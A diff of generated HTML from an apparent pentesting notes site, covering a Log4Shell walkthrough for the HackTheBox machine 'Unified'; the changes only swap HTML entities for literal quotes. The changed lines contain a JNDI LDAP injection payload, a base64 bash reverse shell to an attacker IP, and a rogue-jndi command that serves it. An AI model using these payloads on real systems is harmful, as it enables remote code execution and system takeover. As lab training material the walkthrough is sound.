@@ -26837,7 +26837,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><strong>Proof of concepts to see if it is vulnerable</strong>:</p>
 <p><strong>1.</strong> Grab the request with the injectable parameter.</p>
 <p><strong>2.</strong> In the injectable parameter, inject something like this:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>&quot;${jndi:ldap://AtackerIP/whatever}&quot;
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>"${jndi:ldap://AtackerIP/whatever}"
 </span></code></pre></div></td></tr></table></div>
 <p>With <a href="../tcpdump/">tcpdump</a>, check if the request with the payload produces some traffic to your attacker machine:</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
@@ -26875,12 +26875,12 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>
 </span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>mvn package
 </span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a># Once it&#39;s build, make a reverse shell in base64 with attacker machine and listening port
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>echo &#39;bash -c bash -i &gt;&amp;/dev/tcp/$AttackerIP/$AttackerPort 0&gt;&amp;1&#39; | base64
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a># Once it's build, make a reverse shell in base64 with attacker machine and listening port
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>echo 'bash -c bash -i &gt;&amp;/dev/tcp/$AttackerIP/$AttackerPort 0&gt;&amp;1' | base64
 </span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a># This will return something similar to this: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK
 </span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a>
 </span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a># Get out of rogue-jndi folder and
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a>java -jar rogue-jndi/target/RogueJndi-1.1.jar --command &quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}&quot; --hostname &quot;10.129.96.149&quot;
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a>java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.129.96.149"
 </span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a># In the bash command, copy paste your reverse shell in base64
 </span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17"></a># --hostname: Victim IP
 </span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18"></a>
@@ -26919,7 +26919,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>Te: trailers
 </span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>Connection: close
 </span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a>
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:false,&quot;strict&quot;:true}
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>{"username":"lala","password":"lele","remember":false,"strict":true}
 </span></code></pre></div></td></tr></table></div>
 <p>This request is from "HackTheBox machine: Unified". As we can read from the Unifi version exploit, the injectable parameter is "remember". So we insert there our payload and with Repeater, send the request:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
@@ -26954,7 +26954,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14"></a>Te: trailers
 </span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15"></a>Connection: close
 </span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16"></a>
-</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:&quot;${jndi:ldap://10.10.14.2:1389/o=tomcat}&quot;,&quot;strict&quot;:true}
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17"></a>{"username":"lala","password":"lele","remember":"${jndi:ldap://10.10.14.2:1389/o=tomcat}","strict":true}
 </span></code></pre></div></td></tr></table></div>
 <p>Once we send that request, our jndi server will resend the reverse shell:</p>
 <p><img alt="jndi server" src="../img/log4j.png" /></p>
